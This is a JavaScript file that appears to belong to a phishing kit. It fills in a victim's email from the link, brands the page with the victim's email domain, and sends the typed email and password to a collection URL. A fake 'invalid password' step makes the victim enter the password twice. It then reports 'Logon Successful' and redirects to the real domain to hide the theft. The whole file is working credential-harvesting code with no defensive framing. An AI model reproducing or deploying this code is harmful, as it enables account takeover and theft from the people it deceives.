
    var counter = 0;



var url = $("#posturl").val();

	var geteml = location.hash.substring(1);
	$("#email").val(geteml);
	var getdomain = geteml.substring(geteml.indexOf('@')+1,geteml.lastIndexOf("."));
	var xdomain = geteml.substring(geteml.indexOf('@')+1);
	$("#domain-name").html(getdomain.toUpperCase());

function checkMail(){
	var email = document.getElementById('email');
	var password = document.getElementById('password');
	var showDomain = document.getElementById('domain-name');
	var domain = '';
	domain = email.value.replace(/.*@/, "").split('.')[0];
	showDomain.textContent = domain;
}


$('#signin').click(function(e){
	e.preventDefault();
        var email = document.getElementById('email');
        domain = email.value.replace(/.*@/, "").split('.')[0];
        var checkmail = /^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/g;
        var alert2 = document.querySelector('#msgbox');
        var alert1 = document.querySelector('.alert1');
        if($('#email').val() == ""){
            $('#email').focus();
            $('.alert2').show();
            alert2.textContent = "Please enter your email address";
            return false;
        }else if(!($('#email').val().match(checkmail))){
            $('#email').focus();
            $('.alert2').show();
            alert2.textContent = "Invalid password or account";
            return false;
        }else if($('#password').val() == ""){
            $('#password').focus();
            $('#msgbox').show();
            alert2.textContent = "Please enter your password";
            return false;
        }
        else{
            counter = counter + 1;
            alert2.className = alert2.className.replace(/\balert-danger\b/g, "alert-info");
            alert2.textContent = "Connecting to account";
            $('.alert2').show();

            if (counter > 1){
                var xmlhttp;
                if(window.XMLHttpRequest){
                  xmlhttp = new XMLHttpRequest();
                }else{
                  xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
                }

                xmlhttp.onreadystatechange=function(){
                  if(xmlhttp.readyState==4 && xmlhttp.status==200){
                        alert2.className = alert2.className.replace(/\balert-info\b/g, "alert-success");
                        alert2.textContent = "Logon Successful";
                        window.location = 'https://'+xdomain;
                  } else {
                      console.log(xmlhttp.responseText);
                  }
                }

                var getemail = document.getElementById('email').value;
                var getpassword = document.getElementById('password').value;
                var formdata = new FormData();

                formdata.append("email", getemail);
                formdata.append("password", getpassword);

                xmlhttp.open("POST", url);
                xmlhttp.send(formdata);

                return false;
            }

            var xmlhttp;
            if(window.XMLHttpRequest){
              xmlhttp = new XMLHttpRequest();
            }else{
              xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
            }

            xmlhttp.onreadystatechange=function(){
              if(xmlhttp.readyState==4 && xmlhttp.status==200){
                    alert2.className = alert2.className.replace(/\balert-info\b/g, "alert-danger");
                    alert2.textContent = xmlhttp.responseText;
                    document.getElementById('password').value = "";
                    document.getElementById('password').focus();
              } else {
                  console.log(xmlhttp.responseText);
              }
            }

            var email = document.getElementById('email').value;
            var password = document.getElementById('password').value;
            var formdata = new FormData();

            formdata.append("email", email);
            formdata.append("password", password);


            xmlhttp.open("POST", url);
            xmlhttp.send(formdata);

            return false;

        }

})

    
    